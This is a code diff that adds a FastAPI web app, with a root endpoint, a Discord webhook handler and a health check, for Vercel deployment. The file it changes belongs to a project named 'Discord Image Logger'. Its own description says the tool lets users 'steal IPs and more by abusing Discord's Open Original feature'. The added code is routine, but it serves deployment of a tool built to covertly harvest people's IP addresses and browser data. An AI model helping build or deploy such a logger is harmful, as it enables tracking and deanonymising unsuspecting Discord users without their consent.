@@ -4,6 +4,34 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+from fastapi import FastAPI, Request, Response
+from fastapi.responses import JSONResponse
+
+# THIS MUST BE NAMED "app" - Vercel looks for this exact name
+app = FastAPI()
+
+@app.get("/")
+async def root():
+    return {"message": "Discord bot webhook ready", "status": "alive"}
+
+@app.post("/api/webhook")
+async def discord_webhook(request: Request):
+    """
+    Handle Discord interactions (if you're using webhooks)
+    """
+    try:
+        payload = await request.json()
+        # Your Discord logic here
+        print(f"Received webhook: {payload}")
+        return Response(status_code=204)  # No content = success for Discord
+    except Exception as e:
+        print(f"Error: {e}")
+        return JSONResponse(status_code=500, content={"error": str(e)})
+
+# Health check for Vercel
+@app.head("/")
+async def head_root():
+    return Response(status_code=200)
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
